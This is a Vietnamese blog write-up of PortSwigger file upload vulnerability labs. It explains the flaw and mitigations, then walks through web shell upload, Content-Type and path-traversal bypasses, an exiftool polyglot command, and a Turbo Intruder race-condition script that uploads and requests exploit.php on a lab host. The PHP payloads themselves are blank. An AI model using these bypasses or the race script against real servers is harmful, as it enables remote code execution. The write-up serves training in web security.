---
title: '[PortSwigger] - File upload vulnerabilities'
slug: fileuploadvuln
type: blog
date: 2022-01-05
summary: 'File upload vulnerabilities...'
tags: [security, writeup]
---

# File upload vulnerabilities
### What are file upload vulnerabilities? - Lỗ hổng tải lên file là gì?
Lỗ hổng tải lên file là khi server web cho phép user tải file lên hệ thống file của nó mà không xác nhận đầy đủ những thứ như tên, loại, nội dung hoặc kích thước của chúng. Không thực thi đúng các hạn chế đối với những điều này có thể có nghĩa là ngay cả một chức năng tải lên hình ảnh cơ bản cũng có thể được sử dụng để tải lên các file tùy ý và có khả năng nguy hiểm. Điều này thậm chí có thể bao gồm các file kịch bản phía server cho phép thực thi mã từ xa.
Trong một số trường hợp, bản thân hành động tải file lên đã đủ để gây ra thiệt hại. Các cuộc tấn công khác có thể liên quan đến một yêu cầu HTTP tiếp theo cho file, thường là để kích hoạt việc thực thi của nó bởi server.
### What is the impact of file upload vulnerabilities? - Ảnh hưởng của lỗ hổng tải lên file?
Trong trường hợp xấu nhất, loại file không được xác thực đúng cách và cấu hình server cho phép các file được thực thi dưới dạng mã. Hacker có thể tải lên file mà phía server sẽ có chức năng như webshell và cấp quyền cho hacker toàn quyền kiểm soát máy chủ.
Nếu các file không được xác thực đúng cách thì hacker có thể thay thế các file cùng tên, có thể tải file lên bất kỳ vị trí nào.
### How to prevent file upload vulnerability - Làm sao để ngăn chặn được lỗ hổng này ?
Lỗ hổng tải lên file có thể được ngăn chặn bằng cách thực hiện theo các kỹ thuật giảm thiểu dưới đây:
```
+ Chỉ cho phép một số phần mở rộng file nhất định
+ Giới hạn kích thước file tối đa và độ dài tên
+ Chỉ cho phép user  được ủy quyền
+ Đảm bảo rằng file được tìm nạp từ web là file mong đợi
+ Luôn cập nhật trang web của bạn
+ Đặt tên file một cách ngẫu nhiên hoặc sử dụng hàm băm thay vì user  nhập
+ Chặn tải lên từ bot và tập lệnh bằng captcha
+ Không bao giờ hiển thị đường dẫn của file đã tải lên
```
## PortSwigger Lab
#### Lab: Remote code execution via web shell upload
Bài lab đầu tiên mô tả rõ ràng là chúng ta sẽ khai thác bằng cách up lên 1 file gọi shell vì chức năng của web không hề có xác thực
Truy cập vào lab chúng ta thấy được 1 trang blog, login bằng tk được cấp từ trước:
Chúng ta có được profile có chức năng upload file, chúng ta thử upload 1 file bất kỳ:
Khi xem source của file chúng ta có thể thấy được đường dẫn của file đó như sau:
Do đề bài đã mô tả và đề cập cụ thể nên giờ chúng ta sẽ upload 1 file php lên có code như sau :
```
```
Code PHP như sau sẽ giúp chúng ta xem được file secret của carlos chứa cái gì
#### Lab: Web shell upload via Content-Type restriction bypass
Trong bài lab này web đã thêm vào 1 cơ chế để ngăn chặn upload file bất kỳ bằng phương pháp “Flawed file type validation”
Cụ thể hơn khi chúng ta làm lại các thao tác như bài lab trước chúng ta trả về lỗi sau:
Đây là do cơ chế của chức năng, khi chúng ta upload file php thì Content-Type sẽ là multipart/form-data, trong khi web server mong muốn sẽ là image/jpg, điều đó có nghĩa là chúng ta chỉ cần thay đổi content-type lại thì sẽ có thể bypass của được cơ chế này.
#### Lab: Web shell upload via path traversal
Bài lab đã mô tả rằng sẽ sử dụng 1 cơ chế bảo vệ để người dùng không thể khai thác được lỗi FileUpload. Chúng ta thực hiện tương tự như
Tuy nhiên tên bài lab lại nhắc tới Path traversal, đây là 1 kỹ thuật khá quen thuộc trong bài trước nên mình sẽ áp dụng thử vào request như sau.
Lại thấy error nên mình đoán “/” sẽ gây ra lỗi vì bị filter nên mình sẽ encoding nó thành %2f để thay thế, thì nhận thấy rằng ta có thể bypass qua :v
#### Lab: Web shell upload via extension blacklist bypass
Như bao lỗ hổng nhận input khác, chúng ta có thể sử dụng blacklist để filter đi những input độc hại. File Upload này cũng vậy, server web sẽ filter đi đuổi file php để chúng ta không thể tải file code lên và thực thi được nữa.
#### Lab: Web shell upload via obfuscated file extension
#### Lab: Remote code execution via polyglot web shell upload
Ta thực hiện tương tự các bài lab trước thì thấy kết quả trả về như sau. Bắt lại request và kiểm tra như sau:
Dựa vào mô tả của bài ta nhận thấy được rằng bài đã sử dụng 1 cơ chế xác thực xem file chúng ta upload lên có phải file jpg không bằng cách kiểm tra bytes. Một vài định dạng file sẽ có vài bytes đầu tiên làm mặc định ví dụ như jpg sẽ là FF D8 FF.
Nên khi chúng ta upload file php lên thì webserver sẽ kiểm tra và thấy rằng đây không phải file jpg.
Tuy nhiên cách xác thực này sẽ bị bypass dễ dàng nếu chúng ta sử dụng [exiftool](* để nhúng code vào file jpg để thực thi.
Chúng ta có thể làm điều đó bằng câu lệnh sau:
```
exiftool -Comment="" .jpg -o polyglot.php
```
#### Lab: Web shell upload via race condition
Trong phần này chúng ta sẽ đề cập đến 1 cơ chế khác, thay vì đưa file vào trực tiếp hoặc filer thì một số webserver sẽ sử dụng thư mục tạm thời hoặc sandboxed để lưu trữ file.
Đầu tiên chúng ta làm tương tự những bài lab trước để xác định cơ chế bảo mật.
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
    request1 = '''
POST /my-account/avatar HTTP/1.1
Host: ac121fd11ec509fdc03668110049006b.web-security-academy.net
Cookie: session=4WhFue2DyU7yn4mtliA6cIUXbQWTI1xQ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------39287277810511408971869320025
Content-Length: 548
Origin: https://ac121fd11ec509fdc03668110049006b.web-security-academy.net
Referer: https://ac121fd11ec509fdc03668110049006b.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close
-----------------------------39287277810511408971869320025
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/octet-stream
-----------------------------39287277810511408971869320025
Content-Disposition: form-data; name="user"
wiener
-----------------------------39287277810511408971869320025
Content-Disposition: form-data; name="csrf"
aNQX9ZIGKS8jGa6XcjjWEI4QZfNqLuZv
-----------------------------39287277810511408971869320025--
'''
    request2 = '''
GET /files/avatars/exploit.php HTTP/1.1
Host: ac121fd11ec509fdc03668110049006b.web-security-academy.net
Cookie: session=4WhFue2DyU7yn4mtliA6cIUXbQWTI1xQ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac121fd11ec509fdc03668110049006b.web-security-academy.net/my-account
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
If-Modified-Since: Sat, 08 Jan 2022 20:50:26 GMT
If-None-Match: "37-5d51840ce587a"
Te: trailers
Connection: close
'''
    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')
    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')
    engine.complete(timeout=60)
def handleResponse(req, interesting):
    table.add(req)
```